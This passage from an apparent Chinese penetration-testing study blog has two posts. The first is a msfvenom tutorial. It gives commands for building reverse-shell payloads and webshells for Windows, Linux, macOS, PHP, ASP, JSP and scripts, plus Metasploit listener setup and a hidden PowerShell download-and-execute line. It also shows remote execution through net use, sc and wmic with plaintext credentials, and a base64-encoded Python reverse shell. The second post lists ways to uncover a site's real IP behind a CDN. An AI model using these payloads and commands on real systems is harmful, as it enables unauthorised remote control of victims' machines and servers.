          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-04-27T13:30:20+08:00">
                2020-04-27
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0/" itemprop="url" rel="index">
                    <span itemprop="name">渗透测试学习</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="学习msfvenom生成反弹payload总结"><a href="#学习msfvenom生成反弹payload总结" class="headerlink" title="学习msfvenom生成反弹payload总结"></a>学习msfvenom生成反弹payload总结</h2><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><pre><code>   我们知道目前来说流行的shell主要有两种，一种是**正向shell(bind_shell)**一种是**反向shell(reverse_shell)**</code></pre><p><strong>正向shell</strong>:攻击者连接被攻击者机器，可用于攻击者处于内网，被攻击者处于公网的情况。(攻击者-&gt;被攻击者)</p>
<p><strong>反向shell:</strong>被攻击者主动连接攻击者，可用于攻击者处于外网，被攻击者处于内网的情况。(攻击者&lt;-被攻击者)</p>
<p><strong>nc</strong>可以实现一个很简单的正向与反向shell连接的示例：</p>
<p>正向</p>
<p><img src="1208761-20190108155228561-656308830.png" alt=""></p>
<p>反向</p>
<p><img src="1208761-20190108140558839-392665606.png" alt=""></p>
<p>对于实际的渗透测试过程来说，我们常常使用的往往是反弹shell的方式来突破边界防火墙的限制。</p>
<p><strong>下面列举了一些使用反向shell的情况：</strong></p>
<ul>
<li>目标机器在一个不同（相对攻击者而言）的私有网络</li>
<li>目标机器的防火墙阻挡了所有入口连接（这种情况正向 Shell 是会被防火墙阻挡的）.</li>
<li>由于一些原因，你的 Payload 不能绑定在应该绑定的端口的时候</li>
<li>你还不能确定应该选择反向 Shell 还是正向 Shell 的时候</li>
</ul>
<h2 id="msfvenom"><a href="#msfvenom" class="headerlink" title="msfvenom"></a>msfvenom</h2><p>​        msfvenom是msfpayload,msfencode的结合体，可利用msfvenom生成木马程序,并在目标机上执行,在本地监听上线。Msfvenom 在 2015 年 6 月 8 日已经替代了 msfpayload 与 msfenocde 命令，它是这两个命令的结合体。为了开始使用 msfvenom，可以首先浏览一下它所支持的命令参数：</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200427142626.png" alt=""></p>
<pre><code>Options:
    -p, --payload       &lt;payload&gt;    Payload to use. Specify a &#39;-&#39; or stdin to use custom payloads # 指定特定的 Payload，如果被设置为 - ，那么从标准输入流中读取
        --payload-options            List the payload&#39;s standard options # 列出指定 Payload 的标准可选配置项
    -l, --list          [type]       List a module type. Options are: payloads, encoders, nops, all # 列出所有可用的项目，其中值可以被设置为 payloads, encoders, nops, all
    -n, --nopsled       &lt;length&gt;     Prepend a nopsled of [length] size on to the payload # 指定 nop 在 payload 中的数量（译者注：类似堆喷射中通过 nop 滑动到 payload）
    -f, --format        &lt;format&gt;     Output format (use --help-formats for a list) # 指定 Payload 的输出格式
        --help-formats               List available formats # 列出所有可用的输出格式
    -e, --encoder       &lt;encoder&gt;    The encoder to use # 指定使用的 Encoder
    -a, --arch          &lt;arch&gt;       The architecture to use # 指定目标系统架构
        --platform      &lt;platform&gt;   The platform of the payload # 指定目标系统平台
        --help-platforms             List available platforms # 列出可用的平台
    -s, --space         &lt;length&gt;     The maximum size of the resulting payload # 设置未经编码的 Payload 的最大长度
        --encoder-space &lt;length&gt;     The maximum size of the encoded payload (defaults to the -s value) # 编码后的 Payload 的最大长度
    -b, --bad-chars     &lt;list&gt;       The list of characters to avoid example: &#39;\x00\xff&#39; # 设置需要在 Payload 中避免出现的字符
    -i, --iterations    &lt;count&gt;      The number of times to encode the payload # 设置 Payload 的编码次数
    -c, --add-code      &lt;path&gt;       Specify an additional win32 shellcode file to include # 指定包含一个额外的win32 shellcode文件
    -x, --template      &lt;path&gt;       Specify a custom executable file to use as a template # 指定一个特定的可执行文件作为模板
    -k, --keep                       Preserve the template behavior and inject the payload as a new thread # 保护模板程序的功能，注入的payload作为一个新的进程运行
    -o, --out           &lt;path&gt;       Save the payload # 保存 Payload 到文件
    -v, --var-name      &lt;name&gt;       Specify a custom variable name to use for certain output formats # 指定一个变量名
（译者注：当添加 -f 参数的时候，例如 -f python，那么输出为 python 代码， payload 会被按行格式化为 python 代码，追加到一个 python 变量中，这个参数即为指定 python 变量的变量名）
        --smallest                   Generate the smallest possible payload # 尽可能生成最短的 Payload
    -h, --help                       Show this message # 帮助</code></pre><p>我们可以通过命令列出可用的payloads、encoders、nops。</p>
<pre><code>msfvenom --list payloads
msfvenom --list encoders
msfvenom --list nops</code></pre><p>下面我们使用msf生成一些可用的反弹shell的paylaod。</p>
<h4 id="生成二进制文件"><a href="#生成二进制文件" class="headerlink" title="生成二进制文件"></a>生成二进制文件</h4><p>关于二进制文件，主要介绍适用于Windows、linux、mac操作系统的payload生成与利用。</p>
<h5 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a><strong>Windows</strong></h5><pre><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f exe &gt; shell.exe</code></pre><h5 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h5><pre><code>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f elf &gt; shell.elf</code></pre><h5 id="Mac"><a href="#Mac" class="headerlink" title="Mac"></a>Mac</h5><pre><code>msfvenom -p osx/x86/shell_reverse_tcp LHOST=&lt;Your IP Address&gt;LPORT=&lt;Your Port to Connect On&gt; -f macho &gt; shell.macho</code></pre><h5 id="如何利用"><a href="#如何利用" class="headerlink" title="如何利用"></a>如何利用</h5><p>针对这个部分就以Windows为例，使用上面的命令生成一个exe的payload，命令如下：</p>
<p>攻击机:kali  192.168.153.176</p>
<p>靶机: win7   192.168.153.160</p>
<pre><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.153.176 LPORT=5555 -f exe -o payload.exe</code></pre><p><img src="QQ%E6%88%AA%E5%9B%BE20200427153433.png" alt=""></p>
<p>复制shell.exe到Windows机器，然后kali下开启msf使用如下命令监听4444端口：</p>
<pre><code>msfconsole    //启动msf

use exploit/multi/handler          //使用msf的侦听模块exploit/multi/handler

set PAYLOAD windows/meterpreter/reverse_tcp        //设置载荷payload

set LHOST 192.168.153.176               //设置本地监听机Ip

set LPORT  4444              //设置监听端口

exploit </code></pre><p>执行完之后在Windows下执行payload.exe，然后结果如图：</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200427153539.png" alt=""></p>
<p>在这里既然使用到了在Windows下执行应用程序，我们就大概盘点一下在Windows执行应用程序的几种方式：</p>
<ul>
<li>双击运行</li>
<li>cmd下运行exe</li>
<li>利用Powershell远程下载执行</li>
</ul>
<pre><code>powershell.exe -ExecutionPolicy bypass -noprofile -windowstyle hidden (new-object system.net.webclient).downloadfile(&#39;http://127.0.0.1:8089&#39;,&#39;shell.exe&#39;);
start-process shell.exe</code></pre><ul>
<li>利用at或schtasks设置计划任务执行</li>
</ul>
<pre><code>net use \\192.168.17.138\c$ &quot;admin123&quot; /user:pt007
net use
dir \\192.168.17.138\c$
copy test.exe \\192.168.17.138\c$
sc \\192.168.17.138 create test binpath= &quot;c:\test.exe&quot;
sc \\192.168.17.138 start test
sc \\192.168.17.138 del test</code></pre><ul>
<li>利用wmic远程命令执行</li>
</ul>
<pre><code>wmic /node:192.168.1.158 /user:pt007 /password:admin123  process call create &quot;cmd.exe /c ipconfig&gt;d:\result.txt&quot;</code></pre><h4 id="生成webshell脚本"><a href="#生成webshell脚本" class="headerlink" title="生成webshell脚本"></a><strong>生成webshell脚本</strong></h4><p>​    在做web渗透的时候，经常会用到webshell，我们经常用的一句话用菜刀连接，这里介绍下如何使用msfvenom生成webshell。</p>
<h5 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h5><pre><code>msfvenom -p php/meterpreter_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.php
cat shell.php | pbcopy &amp;&amp; echo &#39;&lt;?php &#39; | tr -d &#39;\n&#39; &gt; shell.php &amp;&amp; pbpaste &gt;&gt; shell.php</code></pre><h5 id="ASP"><a href="#ASP" class="headerlink" title="ASP"></a>ASP</h5><pre class=" language-java"><code class="language-java">msfvenom <span class="token operator">-</span>p windows<span class="token operator">/</span>meterpreter<span class="token operator">/</span>reverse_tcp LHOST<span class="token operator">=</span><span class="token operator">&lt;</span>Your IP Address<span class="token operator">></span> LPORT<span class="token operator">=</span><span class="token operator">&lt;</span>Your Port to Connect On<span class="token operator">></span> <span class="token operator">-</span>f asp <span class="token operator">></span> shell<span class="token punctuation">.</span>asp</code></pre>
<h5 id="JSP"><a href="#JSP" class="headerlink" title="JSP"></a>JSP</h5><pre class=" language-java"><code class="language-java">msfvenom <span class="token operator">-</span>p java<span class="token operator">/</span>jsp_shell_reverse_tcp LHOST<span class="token operator">=</span><span class="token operator">&lt;</span>Your IP Address<span class="token operator">></span> LPORT<span class="token operator">=</span><span class="token operator">&lt;</span>Your Port to Connect On<span class="token operator">></span> <span class="token operator">-</span>f raw <span class="token operator">></span> shell<span class="token punctuation">.</span>jsp</code></pre>
<h5 id="WAR"><a href="#WAR" class="headerlink" title="WAR"></a>WAR</h5><pre class=" language-java"><code class="language-java">msfvenom <span class="token operator">-</span>p java<span class="token operator">/</span>jsp_shell_reverse_tcp LHOST<span class="token operator">=</span><span class="token operator">&lt;</span>Your IP Address<span class="token operator">></span> LPORT<span class="token operator">=</span><span class="token operator">&lt;</span>Your Port to Connect On<span class="token operator">></span> <span class="token operator">-</span>f war <span class="token operator">></span> shell<span class="token punctuation">.</span>war</code></pre>
<h4 id="如何利用-1"><a href="#如何利用-1" class="headerlink" title="如何利用"></a>如何利用</h4><p>下面以php为例做一下测试，使用以下命令生成一个webshell：</p>
<pre class=" language-java"><code class="language-java">msfvenom <span class="token operator">-</span>p php<span class="token operator">/</span>meterpreter_reverse_tcp LHOST<span class="token operator">=</span><span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">88.128</span> LPORT<span class="token operator">=</span><span class="token number">4444</span> <span class="token operator">-</span>f raw <span class="token operator">></span> shell<span class="token punctuation">.</span>php</code></pre>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200427151118.png" alt=""></p>
<p>在kali上使用msf执行下面的命令，监听端口4444：</p>
<pre class=" language-java"><code class="language-java">msfconsole

use exploit<span class="token operator">/</span>multi<span class="token operator">/</span>handler 

set PAYLOAD php<span class="token operator">/</span>meterpreter_reverse_tcp 

set LHOST <span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">153.176</span>

set LPORT  <span class="token number">4444</span> 

exploit</code></pre>
<p>将shell.php放在web目录下，使用浏览器访问，或者使用以下命令执行：</p>
<pre class=" language-java"><code class="language-java">php shell<span class="token punctuation">.</span>php</code></pre>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200427152102.png" alt=""></p>
<h4 id="脚本shell"><a href="#脚本shell" class="headerlink" title="脚本shell"></a>脚本shell</h4><p>关于使用脚本反弹shell的方式，主要以python、bash、perl为例。</p>
<p>这种反弹方式也叫做<strong>git解释性脚本语言反弹shell</strong></p>
<h5 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h5><pre class=" language-java"><code class="language-java">msfvenom <span class="token operator">-</span>p cmd<span class="token operator">/</span>unix<span class="token operator">/</span>reverse_python LHOST<span class="token operator">=</span><span class="token operator">&lt;</span>Your IP Address<span class="token operator">></span> LPORT<span class="token operator">=</span><span class="token operator">&lt;</span>Your Port to Connect On<span class="token operator">></span> <span class="token operator">-</span>f raw <span class="token operator">></span> shell<span class="token punctuation">.</span>py</code></pre>
<h5 id="Bash"><a href="#Bash" class="headerlink" title="Bash"></a>Bash</h5><pre class=" language-java"><code class="language-java">msfvenom <span class="token operator">-</span>p cmd<span class="token operator">/</span>unix<span class="token operator">/</span>reverse_bash LHOST<span class="token operator">=</span><span class="token operator">&lt;</span>Your IP Address<span class="token operator">></span> LPORT<span class="token operator">=</span><span class="token operator">&lt;</span>Your Port to Connect On<span class="token operator">></span> <span class="token operator">-</span>f raw <span class="token operator">></span> shell<span class="token punctuation">.</span>sh</code></pre>
<h5 id="Perl"><a href="#Perl" class="headerlink" title="Perl"></a>Perl</h5><pre class=" language-java"><code class="language-java">msfvenom <span class="token operator">-</span>p cmd<span class="token operator">/</span>unix<span class="token operator">/</span>reverse_perl LHOST<span class="token operator">=</span><span class="token operator">&lt;</span>Your IP Address<span class="token operator">></span> LPORT<span class="token operator">=</span><span class="token operator">&lt;</span>Your Port to Connect On<span class="token operator">></span> <span class="token operator">-</span>f raw <span class="token operator">></span> shell<span class="token punctuation">.</span>pl</code></pre>
<h5 id="如何使用"><a href="#如何使用" class="headerlink" title="如何使用"></a>如何使用</h5><p>下面就以Python为例做一下测试，使用以下命令生成一个脚本：</p>
<pre class=" language-java"><code class="language-java">msfvenom <span class="token operator">-</span>p cmd<span class="token operator">/</span>unix<span class="token operator">/</span>reverse_python LHOST<span class="token operator">=</span><span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">153.176</span> LPORT<span class="token operator">=</span><span class="token number">4444</span> <span class="token operator">-</span>f raw <span class="token operator">></span> shell<span class="token punctuation">.</span>py</code></pre>
<p>在kali上使用msf执行下面的命令，监听端口4444：</p>
<pre class=" language-java"><code class="language-java">msfconsole 

use exploit<span class="token operator">/</span>multi<span class="token operator">/</span>handler 

set PAYLOAD cmd<span class="token operator">/</span>unix<span class="token operator">/</span>reverse_python 

set LHOST <span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">153.176</span> set LPORT  <span class="token number">4444</span> 

exploit </code></pre>
<p>然后复制shell.py中的内容在linux命令行下执行，如下：</p>
<pre class=" language-java"><code class="language-java">python <span class="token operator">-</span>c <span class="token string">"exec('aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zICAgICAgOyAgICBob3N0PSIxOTIuMTY4Ljg4LjEyOCIgICAgICA7ICAgIHBvcnQ9NDQ0NCAgICAgIDsgICAgcz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSkgICAgICA7ICAgIHMuY29ubmVjdCgoaG9zdCxwb3J0KSkgICAgICA7ICAgIG9zLmR1cDIocy5maWxlbm8oKSwwKSAgICAgIDsgICAgb3MuZHVwMihzLmZpbGVubygpLDEpICAgICAgOyAgICBvcy5kdXAyKHMuZmlsZW5vKCksMikgICAgICA7ICAgIHA9c3VicHJvY2Vzcy5jYWxsKCIvYmluL2Jhc2giKQ=='.decode('base64'))"</span></code></pre>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200427150606.png" alt=""></p>
<p>结果如图：</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200427150633.png" alt=""></p>
<h5 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h5><p><a href="https://xz.aliyun.com/t/2380" target="_blank" rel="noopener">https://xz.aliyun.com/t/2380</a></p>
<p><a href="https://blog.51cto.com/13539934/2113551" target="_blank" rel="noopener">https://blog.51cto.com/13539934/2113551</a></p>
<p>[<a href="https://www.sariel.top/2019/08/19/Linux/kali/msfconsole/msfvenom/msfvenom%E5%90%8E%E9%97%A8%E5%AD%A6%E4%B9%A0-windows%E7%AF%87/#o-%E6%96%87%E4%BB%B6%E8%BE%93%E5%87%BA]" target="_blank" rel="noopener">https://www.sariel.top/2019/08/19/Linux/kali/msfconsole/msfvenom/msfvenom%E5%90%8E%E9%97%A8%E5%AD%A6%E4%B9%A0-windows%E7%AF%87/#o-%E6%96%87%E4%BB%B6%E8%BE%93%E5%87%BA]</a>(</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://shu1l.github.io/2020/04/27/rao-guo-cdn-cha-zhao-ip-fang-fa-zong-jie/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Shu1L">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/header.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/04/27/rao-guo-cdn-cha-zhao-ip-fang-fa-zong-jie/" itemprop="url">绕过CDN查找ip方法总结</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-04-27T10:54:39+08:00">
                2020-04-27
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0/" itemprop="url" rel="index">
                    <span itemprop="name">渗透测试学习</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="绕过CDN查找真实IP方法总结"><a href="#绕过CDN查找真实IP方法总结" class="headerlink" title="绕过CDN查找真实IP方法总结"></a>绕过CDN查找真实IP方法总结</h2><h4 id="什么是CDN以及CDN加速？"><a href="#什么是CDN以及CDN加速？" class="headerlink" title="什么是CDN以及CDN加速？"></a>什么是CDN以及CDN加速？</h4><p><strong>(摘自百度百科）</strong></p>
<p>​        CDN的全称是Content Delivery Network，即<a href="https://baike.baidu.com/item/内容分发网络/4034265" target="_blank" rel="noopener">内容分发网络</a>。CDN是构建在现有网络基础之上的智能虚拟网络，依靠部署在各地的边缘服务器，通过中心平台的负载均衡、内容分发、调度等功能模块，使用户就近获取所需内容，降低网络拥塞，提高用户访问响应速度和命中率。CDN的关键技术主要有内容存储和分发技术。</p>
<p><img src="4610b912c8fcc3ce005c05d19c45d688d53f20b0%5B1%5D.png" alt=""></p>
<p>比较常见的基于公有云的高可用架构，即：</p>
<pre><code>域名--&gt;CDN，CDN--&gt;WAF，WAF--&gt;SLB，SLB--&gt;ECS</code></pre><p><strong>CDN对网站有什么好处?</strong></p>
<p>​    首先，开启CDN后的网站，会根据用户所在地的不同访问CDN的节点服务器，并不直接访问源服务器，这样可以减少网站服务器宽带资源,降低服务器压力。这也就是大家都在ping百度,但是不同地区得到的反馈ip不一样的原因。</p>
<p>​    其次，由于CDN节点的阻挡防护，可以更好的保护员服务器的安全。具体来说，CDN其实是充当了一个替身的角色，无论服务器是渗透还是DD0S攻击，攻击的目标都将是CDN节点，这样一来便间接的保护了网站本身。</p>
<p><strong>为什么我们需要绕过CDN？</strong></p>
<pre><code>   对于我们渗透测试者来说，我们在信息收集中重要的一步就是要得到目标服务器主机的**真实IP地址**，但如果目标服务器部署了CDN服务，那么往往我们直接访问得到的IP只是CDN节点服务器的IP，而不是真实的源服务器的IP地址，这是就需要我们想办法绕过CDN获取源服务器IP。</code></pre><p>下面我收集了一些常见的绕过CDN的方法，留作记录:</p>
<h4 id="验证是否存在CDN"><a href="#验证是否存在CDN" class="headerlink" title="验证是否存在CDN"></a>验证是否存在CDN</h4><h5 id="方法1："><a href="#方法1：" class="headerlink" title="方法1："></a>方法1：</h5><p>很简单，使用各种多地 ping 的服务，查看对应 IP 地址是否唯一，如果不唯一多半是使用了CDN， 多地 Ping 网站有：<br> <a href="http://ping.chinaz.com/" target="_blank" rel="noopener">http://ping.chinaz.com/</a><br> <a href="http://ping.aizhan.com/" target="_blank" rel="noopener">http://ping.aizhan.com/</a><br> <a href="http://ce.cloud.360.cn/" target="_blank" rel="noopener">http://ce.cloud.360.cn/</a></p>
<p>我们这里打开第一个网站：ping一下<a href="http://www.baidu.com" target="_blank" rel="noopener">www.baidu.com</a></p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200427093341.png" alt=""></p>
<p>这里可以看出百度的独立IP有17个，且各个节点的返回速度存在不同的延迟。说明百度采用了CDN服务，但是ping没有办法确认真实IP。</p>
<h5 id="方法2："><a href="#方法2：" class="headerlink" title="方法2："></a>方法2：</h5><p>使用 nslookup 进行检测，原理同上，如果返回域名解析对应多个 IP 地址多半是使用了 CDN。有 CDN 的示例：</p>
<blockquote>
<p> <a href="http://www.163.com/" target="_blank" rel="noopener">www.163.com</a><br> 服务器:  public1.114dns.com<br> Address:  114.114.114.114</p>
<p> 非权威应答:<br> 名称:    163.xdwscache.ourglb0.com<br> Addresses:  58.223.164.86</p>
<p> ​          125.75.32.252<br> Aliases:  <a href="http://www.163.com/" target="_blank" rel="noopener">www.163.com</a></p>
<p> ​          <a href="http://www.163.com.lxdns.com/" target="_blank" rel="noopener">www.163.com.lxdns.com</a></p>
</blockquote>
<p>无 CDN 的示例：</p>
<blockquote>
<p> xiaix.me<br> 服务器:  public1.114dns.com<br> Address:  114.114.114.114</p>
<p> 非权威应答:<br> 名称:    xiaix.me<br> Address:  192.3.168.172  </p>
</blockquote>
<p>下面我收集了一些常见的绕过CDN查找真实IP的方法，留作记录:</p>
<h4 id="绕过-CDN-查找网站真实-IP"><a href="#绕过-CDN-查找网站真实-IP" class="headerlink" title="绕过 CDN 查找网站真实 IP"></a>绕过 CDN 查找网站真实 IP</h4><h5 id="1-查询历史DNS记录"><a href="#1-查询历史DNS记录" class="headerlink" title="1:查询历史DNS记录"></a>1:查询历史DNS记录</h5><p>1）查看 IP 与 域名绑定的历史记录，可能会存在使用 CDN 前的记录，相关查询网站有：<br> <a href="https://dnsdb.io/zh-cn/" target="_blank" rel="noopener">https://dnsdb.io/zh-cn/</a>     ###DNS查询<br> <a href="https://x.threatbook.cn/" target="_blank" rel="noopener">https://x.threatbook.cn/</a>    ###微步在线<br> <a href="http://toolbar.netcraft.com/site_report?url=" target="_blank" rel="noopener">http://toolbar.netcraft.com/site_report?url=</a>    ###在线域名信息查询<br> <a href="http://viewdns.info/" target="_blank" rel="noopener">http://viewdns.info/</a>        ###DNS、IP等查询<br> <a href="https://tools.ipip.net/cdn.php" target="_blank" rel="noopener">https://tools.ipip.net/cdn.php</a>  ###CDN查询IP</p>
<p>2）利用<a href="https://securitytrails.com/" target="_blank" rel="noopener">SecurityTrails</a>平台，攻击者就可以精准的找到真实原始IP。他们只需在搜索字段中输入网站域名，然后按Enter键即可，这时“历史数据”就可以在左侧的菜单中找到。</p>
<p>如何寻找隐藏在CloudFlare或TOR背后的真实原始IP</p>
<p><img src="1058583-20181009230838766-860479177%5B1%5D.png" alt=""></p>
<p>除了过去的DNS记录，即使是当前的记录也可能泄漏原始服务器IP。例如，MX记录是一种常见的查找IP的方式。如果网站在与web相同的服务器和IP上托管自己的邮件服务器，那么原始服务器IP将在MX记录中。</p>
<p><strong>MX记录</strong></p>
<p>邮件交换记录 (<strong>MX record</strong>)是域名系统（DNS）中的一种资源记录类型，用于指定负责处理发往收件人域名的邮件服务器</p>
<h5 id="2-查询子域名寻找真实IP"><a href="#2-查询子域名寻找真实IP" class="headerlink" title="2.查询子域名寻找真实IP"></a>2.查询子域名寻找真实IP</h5><p>毕竟 CDN 还是不便宜的，所以很多站长可能只会对主站或者流量大的子站点做了 CDN，而很多小站子站点又跟主站在同一台服务器或者同一个C段内，此时就可以通过查询子域名对应的 IP 来辅助查找网站的真实IP。</p>
<p>下面介绍些常用的子域名查找的方法和工具：</p>
<p>1）微步在线(<a href="https://x.threatbook.cn/" target="_blank" rel="noopener">https://x.threatbook.cn/</a>)</p>
<p>上文提到的微步在线功能强大，黑客只需输入要查找的域名(如baidu.com)，点击子域名选项就可以查找它的子域名了，但是免费用户每月只有5次免费查询机会。如图：</p>
<p><img src="1058583-20181009230922994-1826758810%5B1%5D.png" alt=""></p>
<p>2）Dnsdb查询法。(<a href="https://dnsdb.io/zh-cn/" target="_blank" rel="noopener">https://dnsdb.io/zh-cn/</a>)</p>
<p>黑客只需输入baidu.com type:A就能收集百度的子域名和ip了。如图：<br> <img src="QQ%E6%88%AA%E5%9B%BE20200427094630.png" alt=""></p>
<p>3）Google 搜索</p>
<p>Google site:baidu.com -www就能查看除www外的子域名，如图：</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200427095533.png" alt=""></p>
<p>4）各种子域名扫描器</p>
<p>这里，主要为大家推荐子域名挖掘机和lijiejie的subdomainbrute(<a href="https://github.com/lijiejie/subDomainsBrute" target="_blank" rel="noopener">https://github.com/lijiejie/subDomainsBrute</a>)</p>
<p>子域名挖掘机仅需输入域名即可基于字典挖掘它的子域名，如图：</p>
<p><img src="1058583-20181009231018377-2070670991%5B1%5D.png" alt=""></p>
<p>Subdomainbrute以windows为例，黑客仅需打开cmd进入它所在的目录输入</p>
<p><code>Python subdomainbrute.py baidu.com --full</code></p>
<p>即可收集百度的子域名，如图：</p>
<p><img src="1058583-20181009231030794-1664451845%5B1%5D.png" alt=""></p>
<p>注：收集子域名后尝试以解析ip不在cdn上的ip解析主站，真实ip成功被获取到。</p>
<h5 id="3：网络空间引擎搜索法"><a href="#3：网络空间引擎搜索法" class="headerlink" title="3：网络空间引擎搜索法"></a>3：网络空间引擎搜索法</h5><p>常见的有以前的钟馗之眼，<a href="https://www.shodan.io/" target="_blank" rel="noopener">shodan</a>，<a href="https://fofa.so/" target="_blank" rel="noopener">fofa搜索</a>。以fofa为例，只需输入：title:“网站的title关键字”或者body：“网站的body特征”就可以找出fofa收录的有这些关键字的ip域名，很多时候能获取网站的真实ip，如图：</p>
<p> <img src="1058583-20181009231044976-1731199101%5B1%5D.png" alt=""></p>
<h5 id="4-利用SSL证书寻找真实原始IP"><a href="#4-利用SSL证书寻找真实原始IP" class="headerlink" title="4:利用SSL证书寻找真实原始IP"></a>4:利用SSL证书寻找真实原始IP</h5><p><strong>SSL证书</strong></p>
<p>​        SSL证书是<a href="https://baike.baidu.com/item/数字证书/326874" target="_blank" rel="noopener">数字证书</a>的一种，类似于驾驶证、护照和营业执照的电子副本。因为配置在服务器上，也称为SSL服务器证书。SSL 证书就是遵守 SSL协议，由受信任的数字证书颁发机构CA，在验证服务器身份后颁发，具有服务器身份验证和数据传输加密功能。</p>
<p>​        以CloudFlare这款CDN加速器举例：假如你在 abc.com 上托管了一个服务，原始服务器IP是136.23.63.44。 而CloudFlare则会为你提供DDoS保护，Web应用程序防火墙和其他一些安全服务，以保护你的服务免受攻击。</p>
<p>​        为此，你的Web服务器就必须支持SSL并具有证书，此时CloudFlare与你的服务器之间的通信，就像你和CloudFlare之间的通信一样，会被加密（即没有灵活的SSL存在）。这看起来很安全，但问题是，当你在端口443<code>https://136.23.63.44:443</code>上直接连接到IP时，SSL证书就会被暴露。</p>
<p>​        此时，如果攻击者扫描0.0.0.0/0，即整个互联网，他们就可以在端口443上获取在 aaa.com上的有效证书，进而获取提供给你的Web服务器IP。</p>
<p><a href="https://link.zhihu.com/?target=https%3A//censys.io/certificates/">https://censys.io/certificates/</a> 通过SSL证书查询真实IP（推荐）</p>
<p><strong>Censys证书查询搜索步骤如下：</strong></p>
<p>1、aaa.com 证书的搜索查询参数为：<code>parsed.names：aaa.com</code></p>
<p>只显示有效证书的查询参数为：<code>tags.raw：trusted</code></p>
<p>攻击者可以在Censys上实现多个参数的组合，这可以通过使用简单的布尔逻辑来完成。</p>
<p>2、组合后的搜索参数为：<code>parsed.names: aaa.com and tags.raw: trusted</code></p>
<p>3、Censys将向你显示符合上述搜索条件的所有标准证书。要逐个查看这些搜索结果，攻击者可以通过单击右侧的“<strong>Explore</strong>”，打开包含多个工具的下拉菜单。What’s using this certificate? &gt; <strong>IPv4 Hosts</strong>；</p>
<p>隐藏服务具有SSL证书，要查找它使用的IPv4，只需将”SHA1 fingerprint”（签名证书的sha1值，也就是SHA1指纹）粘贴到Censys平台IPv4主机搜索中，即可找到证书，使用此方法可以轻松找到配置错误的Web服务器真实IP。</p>
<h5 id="方法5-利用HTTP标头寻找真实原始IP"><a href="#方法5-利用HTTP标头寻找真实原始IP" class="headerlink" title="方法5:利用HTTP标头寻找真实原始IP"></a>方法5:利用HTTP标头寻找真实原始IP</h5><p>借助SecurityTrails这样的平台，任何人都可以在茫茫的大数据搜索到自己的目标，甚至可以通过比较HTTP标头来查找到原始服务器。</p>
<p>特别是当用户拥有一个非常特别的服务器名称与软件名称时，攻击者找到你就变得更容易。</p>
